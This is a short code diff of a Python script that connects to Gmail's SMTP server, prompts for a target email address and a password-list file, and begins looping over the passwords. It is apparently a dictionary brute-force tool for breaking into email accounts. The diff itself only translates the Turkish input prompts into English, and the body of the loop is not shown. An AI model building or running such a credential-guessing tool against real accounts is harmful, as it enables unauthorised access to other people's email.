@@ -4,8 +4,8 @@ smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
 smtpserver.ehlo()
 smtpserver.starttls()
 
-user = raw_input("Hedef email adresi: ")
-passwfile = raw_input("Dosya adı parola: ")
+user = raw_input("email address: ")
+passwfile = raw_input("passwfile: ")
 passwfile = open(passwfile, "r")
 
 for password in passwfile:
